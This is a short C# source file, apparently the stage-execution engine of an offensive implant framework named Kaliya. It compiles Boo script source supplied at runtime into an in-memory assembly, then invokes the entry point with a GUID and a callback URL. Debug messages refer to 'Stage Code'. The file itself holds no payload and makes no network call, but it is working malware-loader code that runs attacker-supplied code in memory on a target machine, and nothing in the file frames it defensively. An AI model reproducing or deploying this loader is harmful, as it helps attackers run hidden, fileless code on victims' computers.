using System;
using Boo.Lang.Compiler;
using Boo.Lang.Compiler.IO;
using Boo.Lang.Compiler.Pipelines;

namespace Kaliya.Engine
{
    public class Boo
    {
        public static void Run(string source, string guid, string url)
        {
#if DEBUG
            Console.WriteLine("\n[*] Compiling Stage Code");
#endif
            var compiler = new BooCompiler();
            compiler.Parameters.Input.Add(new StringInput("Stage.boo", source));
            compiler.Parameters.Pipeline = new CompileToMemory();
            compiler.Parameters.Ducky = true;
            compiler.Parameters.References.Add(compiler.Parameters.LoadAssembly("System.Web.Extensions", true));

            var context = compiler.Run();
            
            if (context.GeneratedAssembly == null)
            {
#if DEBUG
                Console.WriteLine("[-] Error(s) compiling script, this probably means your Boo script has bugs\n");
                foreach (var error in context.Errors)
                {
                    Console.WriteLine(error);
                }
#endif
                return;
            }
#if DEBUG
            Console.WriteLine("[+] Compilation Successful!");
            Console.WriteLine("[*] Executing");
#endif
            context.GeneratedAssembly.EntryPoint.Invoke(null, new object[] { new[] { guid, url } });
            
        }
    }
}